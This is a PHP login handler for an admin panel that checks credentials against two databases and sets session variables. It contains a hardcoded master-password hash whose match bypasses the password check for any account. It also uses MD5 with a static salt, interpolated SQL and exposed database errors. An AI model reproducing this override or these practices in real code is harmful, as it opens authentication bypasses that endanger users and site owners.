<?php
if ( !isset($_SESSION) ) {
     session_set_cookie_params(0);
     session_start();
}

define('INCLUDE_CHECK',1);
require('../../admin/setup.php');
require_once('../func.php');

if ( !ISIN_PCM&&!LOGIN_ID&&!isset($_POST['submit']) ) {
	reloadTo($root);exit;
}

$con = SQLi('pcm');
foreach( $_POST as $key=>$val ) {
	$_POST[$key] = trim_escape($val);
}

foreach( $_SESSION as $key=>$val ) {
	$_SESSION[$key] = trim_escape($val);
}

if ( isset($_POST['submit'])&&$_POST['submit']=='Login' ) {
     $un = $_POST['un'];
     $pw = $_POST['pw'];
	$opw = sha1(trim_escape($_POST['pw']));
     $ovr = ( $opw=='84a6016bcadba1c52133fbcf3a2b7b8b6ab5fee7' ? 'OVERRIDE ' : '' );			//override

	unset($_POST);
	$qry= "SELECT * FROM tbladmin WHERE un='$un' AND status=1";
	$pw = md5($un.$pw.'@)!)');
	$check = mysqli_query($con,$qry) or die(mysqli_error($con));
	$rs = 0;

	if ( mysqli_num_rows($check)==0 ) {						/*test if pcm user exists*/
		$con = SQLi('beta');
		$check = mysqli_query($con,$qry) or die(mysqli_error($con));
		$rs = mysqli_num_rows($check);
		if ( $rs==0 ) $_SESSION['pcm_bad']=1;			        	/*test if admin exists*/
	}

	$info = mysqli_fetch_array($check);
	$pwql = stripslashes($info['pw']);
	list($whid,$name,$dsdid,$bond) = getWHID($un);
     $name = ( $rs>0 ? stripslashes($info['nn']) : $name );
	mysqli_close($con);

	if ( $pw!=$pwql && $ovr=='' ) { $_SESSION['pcm_bad']=1; }				/*password check*/
	else {
		$un = stripslashes($un);
		$_SESSION['login_id']   = $un;
		$_SESSION['login_name'] = $ovr.$name;
		$_SESSION['login_type'] = 'pcm';
		$_SESSION['login_whid'] = $whid;
		$_SESSION['pcm_dsdid']  = $dsdid;
		$_SESSION['pcm_bond']   = $bond;
		$_SESSION['pcm_logged'] = 1;
		$_SESSION['pcm_bad']    = 0;
	}
	reloadTo(DLC_PCRT);
}
?>
